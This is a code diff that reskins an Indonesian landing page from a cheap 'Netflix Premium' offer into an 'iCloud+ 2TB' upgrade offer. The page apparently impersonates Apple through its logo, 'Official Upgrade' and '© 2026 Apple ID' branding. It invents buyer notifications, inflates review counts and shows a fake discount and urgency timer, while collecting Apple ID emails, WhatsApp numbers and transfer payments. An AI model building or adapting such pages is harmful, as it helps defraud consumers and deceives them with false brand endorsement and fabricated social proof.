@@ -1,9 +1,82 @@
----
-import Layout from '../../layouts/Layout.astro';
-import '../../styles/page-nfxid.css';
----
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Upgrade iCloud+ 2TB - Penawaran Spesial!</title>
+    <link rel="icon" href="/assets/images/icloud.webp">
 
-<Layout title="Langganan Netflix Premium 1 Tahun - Penawaran Spesial!" favicon="/assets/images/netflix.webp" pageJs="/assets/js/page-nfxid.js" pixelId="668703605199479">
+    <link rel="stylesheet" href="/styles/styles.css">
+
+    <link rel="preload" href="/fonts/inter/inter-latin-400-normal.woff2" as="font" type="font/woff2" crossorigin>
+    <link rel="preload" href="/fonts/inter/inter-latin-700-normal.woff2" as="font" type="font/woff2" crossorigin>
+
+    <link rel="preload" href="/fonts/fontawesome/webfonts/fa-brands-400.subset.woff2" as="font" type="font/woff2" crossorigin>
+    <link rel="preload" href="/fonts/fontawesome/webfonts/fa-solid-900.subset.woff2" as="font" type="font/woff2" crossorigin>
+    <link rel="preload" href="/fonts/fontawesome/webfonts/fa-regular-400.subset.woff2" as="font" type="font/woff2" crossorigin>
+
+    <style>
+        @font-face {
+            font-family: 'Inter';
+            font-style: normal;
+            font-weight: 300;
+            font-display: swap;
+            src: url('/fonts/inter/inter-latin-300-normal.woff2') format('woff2');
+        }
+        @font-face {
+            font-family: 'Inter';
+            font-style: normal;
+            font-weight: 400;
+            font-display: swap;
+            src: url('/fonts/inter/inter-latin-400-normal.woff2') format('woff2');
+        }
+        @font-face {
+            font-family: 'Inter';
+            font-style: normal;
+            font-weight: 500;
+            font-display: swap;
+            src: url('/fonts/inter/inter-latin-500-normal.woff2') format('woff2');
+        }
+        @font-face {
+            font-family: 'Inter';
+            font-style: normal;
+            font-weight: 600;
+            font-display: swap;
+            src: url('/fonts/inter/inter-latin-600-normal.woff2') format('woff2');
+        }
+        @font-face {
+            font-family: 'Inter';
+            font-style: normal;
+            font-weight: 700;
+            font-display: swap;
+            src: url('/fonts/inter/inter-latin-700-normal.woff2') format('woff2');
+        }
+    </style>
+
+    <link rel="dns-prefetch" href="https://connect.facebook.net">
+
+    <!-- Meta Pixel Code -->
+    <script>
+        !function (f, b, e, v, n, t, s) {
+            if (f.fbq) return; n = f.fbq = function () {
+                n.callMethod ?
+                    n.callMethod.apply(n, arguments) : n.queue.push(arguments)
+            };
+            if (!f._fbq) f._fbq = n; n.push = n; n.loaded = !0; n.version = '2.0';
+            n.queue = []; t = b.createElement(e); t.async = !0;
+            t.src = v; s = b.getElementsByTagName(e)[0];
+            s.parentNode.insertBefore(t, s)
+        }(window, document, 'script',
+            'https://connect.facebook.net/en_US/fbevents.js');
+        fbq('init', '543015247954222');
+        fbq('track', 'PageView');
+    </script>
+    <noscript><img height="1" width="1" style="display:none"
+            src="https://www.facebook.com/tr?id=543015247954222&ev=PageView&noscript=1" /></noscript>
+    <!-- End Meta Pixel Code -->
+</head>
+<body>
+
 <!-- Notification Toast -->
     <div id="toast" class="toast">
         <div class="w-8 h-8 rounded-full bg-green-100 flex items-center justify-center text-green-600 flex-shrink-0">
@@ -11,7 +84,7 @@ import '../../styles/page-nfxid.css';
         </div>
         <div class="text-sm">
             <p class="font-semibold text-gray-900" id="toast-name">Budi Santoso</p>
-            <p class="text-gray-500 text-xs">Baru saja membeli paket 1 Tahun</p>
+            <p class="text-gray-500 text-xs">Baru saja upgrade iCloud+ 2TB</p>
         </div>
     </div>
 
@@ -21,15 +94,15 @@ import '../../styles/page-nfxid.css';
             <!-- Header -->
             <div class="sticky-header px-6 py-4 flex items-center justify-between">
                 <div class="flex items-center gap-2">
-            <img src="/assets/images/netflix.webp"
-                        alt="Netflix Logo" class="w-8 h-8" loading="eager" decoding="async" width="32" height="32">
+            <img src="/assets/images/icloud.webp"
+                        alt="iCloud Logo" class="w-8 h-8 object-contain" loading="eager" decoding="async" width="32" height="32">
                     <div>
-                        <h1 class="font-bold text-lg leading-none">Netflix Premium</h1>
-                        <p class="text-xs text-gray-500 font-medium">Official & Legal</p>
+                        <h1 class="font-bold text-lg leading-none">iCloud+</h1>
+                        <p class="text-xs text-gray-500 font-medium">Official Upgrade</p>
                     </div>
                 </div>
-                <div class="bg-red-50 text-red-600 px-3 py-1 rounded-full text-xs font-semibold">
-                    <i class="fas fa-check-circle mr-1"></i> Garansi Resmi
+                <div class="bg-blue-50 text-blue-600 px-3 py-1 rounded-full text-xs font-semibold">
+                    <i class="fas fa-check-circle mr-1"></i> Terverifikasi
                 </div>
             </div>
 
@@ -40,9 +113,9 @@ import '../../styles/page-nfxid.css';
                         class="inline-block bg-red-100 text-red-600 px-3 py-1 rounded-full text-xs font-bold mb-3 animate-pulse">
                         🔥 PENAWARAN SPESIAL
                     </span>
-                    <h2 class="text-2xl font-bold mb-2">Nonton Sepuasnya Tanpa Batas</h2>
-                    <p class="text-gray-500 text-sm px-4">Langganan Netflix Premium murah, legal, dan bergaransi penuh.
-                    </p>
+                    <h2 class="text-2xl font-bold mb-2">Upgrade iCloud+ 2TB</h2>
+                    <p class="text-gray-500 text-sm px-4">Simpan foto, video, dan file dengan aman. Upgrade legal ke
+                        Apple ID pribadi.</p>
                 </div>
 
                 <!-- Form -->
@@ -53,40 +126,40 @@ import '../../styles/page-nfxid.css';
                         <div id="package-selection-container" class="space-y-3">
                             <!-- Server-rendered default state (Yearly) for LCP -->
                             <article class="relative overflow-hidden rounded-2xl border border-gray-200 bg-white shadow-sm">
-                                <div class="bg-gradient-to-br from-red-50 via-white to-red-50 p-4 pb-3 border-b border-gray-100">
+                                <div class="bg-gradient-to-br from-blue-50 via-white to-cyan-50 p-4 pb-3 border-b border-gray-100">
                                     <div class="flex items-start justify-between mb-2">
                                         <div class="flex items-center gap-2">
-                                            <span class="inline-flex items-center gap-1 rounded-full bg-red-100 px-2 py-0.5 text-[11px] font-bold text-red-700">
+                                            <span class="inline-flex items-center gap-1 rounded-full bg-blue-100 px-2 py-0.5 text-[11px] font-bold text-blue-700">
                                                 <span class="relative flex h-1.5 w-1.5">
-                                                    <span class="animate-ping absolute inline-flex h-full w-full rounded-full bg-red-500 opacity-75"></span>
-                                                    <span class="relative inline-flex rounded-full h-1.5 w-1.5 bg-red-600"></span>
+                                                    <span class="animate-ping absolute inline-flex h-full w-full rounded-full bg-blue-500 opacity-75"></span>
+                                                    <span class="relative inline-flex rounded-full h-1.5 w-1.5 bg-blue-600"></span>
                                                 </span>
                                                 Stok Tersedia
                                             </span>
                                         </div>
-                                        <span class="rounded-md bg-black px-2 py-0.5 text-[10px] font-bold text-white uppercase tracking-wide">Premium</span>
+                                        <span class="rounded-md bg-black px-2 py-0.5 text-[10px] font-bold text-white uppercase tracking-wide">Popular</span>
                                     </div>
 
-                                    <h3 class="text-[19px] font-extrabold text-gray-900 leading-tight mb-1">Netflix Premium 4K</h3>
+                                    <h3 class="text-[19px] font-extrabold text-gray-900 leading-tight mb-1">iCloud+ 2TB</h3>
                                     <p class="text-[13px] text-gray-600 font-medium flex items-center gap-1">
-                                        <i class="fas fa-check-circle text-red-600 text-xs"></i>
-                                        Ultra HD, Tanpa Iklan, Full Garansi
+                                        <i class="fas fa-check-circle text-blue-600 text-xs"></i>
+                                        Family Sharing Support
                                     </p>
                                 </div>
 
                                 <div class="px-4 pb-4">
-                                    <div class="bg-gradient-to-br from-red-50 to-red-100 rounded-xl p-3 border border-red-200">
+                                    <div class="bg-gradient-to-br from-blue-50 to-cyan-50 rounded-xl p-3 border border-blue-100">
                                         <div class="flex items-center justify-between mb-1">
                                             <div>
                                                 <p class="text-[11px] font-semibold text-gray-500 mb-0.5">Harga Promo Hari Ini</p>
                                                 <div class="flex items-baseline gap-2">
-                                                    <span class="text-[28px] font-black text-red-600 leading-none tracking-tight">Rp 179.000</span>
+                                                    <span class="text-[28px] font-black text-blue-600 leading-none tracking-tight">Rp 350.000</span>
                                                 </div>
                                             </div>
                                             <div class="text-right">
                                                 <p class="text-[10px] text-gray-500 mb-0.5">Normal</p>
-                                                <span class="text-[13px] font-bold text-gray-400 line-through">Rp 2.200.000</span>
-                                                <p class="text-[11px] font-bold text-green-600 mt-0.5">Hemat 90%</p>
+                                                <span class="text-[13px] font-bold text-gray-400 line-through">Rp 1.500.000</span>
+                                                <p class="text-[11px] font-bold text-green-600 mt-0.5">Hemat 77%</p>
                                             </div>
                                         </div>
                                     </div>
@@ -124,7 +197,7 @@ import '../../styles/page-nfxid.css';
                                 <div class="px-4 pb-4">
                                     <div class="flex gap-2">
                                         <button type="button" onclick="document.getElementById('nama').focus()"
-                                            class="flex-1 h-12 rounded-xl bg-[#E50914] text-white shadow-md active:scale-[0.98] transition-all hover:bg-[#b80710] group">
+                                            class="flex-1 h-12 rounded-xl bg-[#007aff] text-white shadow-md active:scale-[0.98] transition-all hover:bg-[#0062cc] group">
                                             <div class="flex items-center justify-center gap-2 font-bold text-[15px]">
                                                 <span>Ambil Promo Sekarang</span>
                                                 <i class="fas fa-arrow-right text-sm opacity-80 group-hover:translate-x-1 transition-transform"></i>
@@ -132,7 +205,7 @@ import '../../styles/page-nfxid.css';
                                         </button>
 
                                         <button id="btnDetail" type="button"
-                                            class="h-12 w-12 rounded-xl border-2 border-gray-200 bg-white text-gray-600 flex items-center justify-center active:scale-[0.95] hover:bg-gray-50 hover:border-red-200 transition-all"
+                                            class="h-12 w-12 rounded-xl border-2 border-gray-200 bg-white text-gray-600 flex items-center justify-center active:scale-[0.95] hover:bg-gray-50 hover:border-blue-200 transition-all"
                                             aria-label="Lihat Detail Lengkap">
                                             <i class="fas fa-info-circle text-[17px]"></i>
                                         </button>
@@ -156,7 +229,7 @@ import '../../styles/page-nfxid.css';
                                 class="flex items-center gap-1.5 bg-yellow-50 px-2 py-1 rounded-lg border border-yellow-100">
                                 <i class="fas fa-star text-yellow-500 text-xs"></i>
                                 <span class="text-xs font-bold text-gray-800">4.9/5.0</span>
-                                <span class="text-[10px] text-gray-500">(12.4k+ Ulasan)</span>
+                                <span class="text-[10px] text-gray-500">(15.8k+ Ulasan)</span>
                             </div>
                         </div>
                         <div class="testimonial-carousel" id="testimonial-container">
@@ -182,7 +255,7 @@ import '../../styles/page-nfxid.css';
 
                         <div class="input-group">
                             <input type="email" id="email" name="email" class="modern-input"
-                                placeholder="Email Anda (untuk pengiriman akun)" required>
+                                placeholder="Email Apple ID (Gmail/iCloud)" required>
                             <i class="fas fa-envelope input-icon"></i>
                         </div>
                     </div>
@@ -195,15 +268,15 @@ import '../../styles/page-nfxid.css';
                         <div>
                             <h3 class="font-bold text-red-700 text-sm uppercase">PENTING: Cek Kembali Data Anda!</h3>
                             <p class="text-sm text-gray-700 leading-tight mt-0.5">
-                                Pastikan <strong>No. WhatsApp</strong> & <strong>Email</strong> yang Anda masukkan sudah
-                                <strong>BENAR</strong> dan <strong>AKTIF</strong>.
+                                Pastikan <strong>No. WhatsApp</strong> & <strong>Email Apple ID</strong> yang Anda
+                                masukkan sudah <strong>BENAR</strong>.
                             </p>
                         </div>
                     </div>
 
                     <!-- Hidden Fields -->
                     <input type="text" name="honeypot" style="display: none" tabindex="-1" autocomplete="off">
-                    <input type="hidden" name="sheetName" value="nfx">
+                    <input type="hidden" name="sheetName" value="icloud">
 
                     <!-- Payment Method -->
                     <div class="space-y-3 animate-fade-in" style="animation-delay: 0.25s">
@@ -240,8 +313,7 @@ import '../../styles/page-nfxid.css';
                     </span>
                 </div>
 
-                <p class="text-center text-xs text-gray-400 mt-8">© 2026 Netflix ID. All Rights Reserved.
-                </p>
+                <p class="text-center text-xs text-gray-400 mt-8">© 2026 Apple ID. All Rights Reserved.</p>
             </div>
 
             <!-- Sticky Bottom Bar -->
@@ -250,7 +322,7 @@ import '../../styles/page-nfxid.css';
                 <div class="max-w-[520px] mx-auto flex items-center justify-between gap-4">
                     <div>
                         <p class="text-xs text-gray-500">Total Pembayaran</p>
-                        <p class="text-xl font-bold text-red-600" id="total-price-display">Rp 179.xxx</p>
+                        <p class="text-xl font-bold text-blue-600" id="total-price-display">Rp 350.xxx</p>
                     </div>
                     <button type="button" id="submit-btn" class="btn-checkout flex-1" onclick="handleFormSubmit()">
                         Beli Sekarang <i class="fas fa-arrow-right"></i>
@@ -270,7 +342,7 @@ import '../../styles/page-nfxid.css';
 
             <div class="p-6 pb-24">
                 <!-- Timer -->
-                <div class="bg-red-600 text-white rounded-xl p-4 text-center mb-6 shadow-lg shadow-red-200">
+                <div class="bg-blue-600 text-white rounded-xl p-4 text-center mb-6 shadow-lg shadow-blue-200">
                     <p class="text-xs opacity-80 mb-1">Selesaikan pembayaran dalam</p>
                     <div class="text-2xl font-bold font-mono" id="countdown">23:59:59</div>
                 </div>
@@ -281,7 +353,7 @@ import '../../styles/page-nfxid.css';
                     <div class="absolute top-0 left-0 w-full h-1 bg-gray-200"></div>
                     <p class="text-gray-500 text-sm mb-1">Total yang harus dibayar</p>
                     <div class="flex items-center justify-center gap-2 mb-2">
-                        <h1 class="text-3xl font-bold text-gray-900" id="payment-amount">Rp 179.123</h1>
+                        <h1 class="text-3xl font-bold text-gray-900" id="payment-amount">Rp 350.123</h1>
                         <button class="copy-btn" onclick="copyText('payment-amount-raw')"><i
                                 class="far fa-copy"></i></button>
                     </div>
@@ -395,7 +467,7 @@ import '../../styles/page-nfxid.css';
                     </ul>
 
                     <button id="btnOk" type="button"
-                        class="mt-4 h-12 w-full rounded-2xl bg-[#E50914] text-sm font-semibold text-white active:scale-[.99]">
+                        class="mt-4 h-12 w-full rounded-2xl bg-[#007aff] text-sm font-semibold text-white active:scale-[.99]">
                         Oke, Mengerti
                     </button>
                 </div>
@@ -443,13 +515,13 @@ import '../../styles/page-nfxid.css';
     <div id="infoModal" class="modal-overlay">
         <div class="modal-box">
             <div
-                class="w-16 h-16 bg-red-100 text-red-600 rounded-full flex items-center justify-center mx-auto mb-4 text-2xl">
+                class="w-16 h-16 bg-blue-100 text-blue-600 rounded-full flex items-center justify-center mx-auto mb-4 text-2xl">
                 <i class="fas fa-info"></i>
             </div>
             <h3 class="text-xl font-bold mb-2" id="modalTitle">Judul</h3>
             <p class="text-gray-500 mb-6" id="modalMessage">Pesan</p>
             <button onclick="closeModal('infoModal')"
-                class="w-full bg-red-600 text-white font-bold py-3 rounded-xl">Mengerti</button>
+                class="w-full bg-blue-600 text-white font-bold py-3 rounded-xl">Mengerti</button>
         </div>
     </div>
 
@@ -476,4 +548,16 @@ import '../../styles/page-nfxid.css';
                 onclick="closeModal('imageModal')">&times;</button>
         </div>
     </div>
-</Layout>
+
+
+    <script src="/assets/js/vendor-loader.js" defer></script>
+    <script src="/assets/js/page-icloud.js" defer></script>
+    <script src="/assets/js/shared.js" defer></script>
+
+    <script type="text/javascript"
+        src="https://static.cloudflareinsights.com/beacon.min.js/vcd15cbe7772f49c399c6a5babf22c1241717689176015"
+        integrity="sha512-ZpsOmlRQV6y907TI0dKBHq9Md29nnaEIPlkf84rnaERnq6zvWvPUqr2ft8M1aS28oN72PdrCzSjY4U6VaAw1EQ=="
+        data-cf-beacon='{"version":"2024.11.0","token":"3b87c4a589154f7682d399347d7eccc5","r":1,"server_timing":{"name":{"cfCacheStatus":true,"cfEdge":true,"cfExtPri":true,"cfL4":true,"cfOrigin":true,"cfSpeedBrain":true},"location_startswith":null}}'
+        crossorigin="anonymous"></script>
+</body>
+</html>
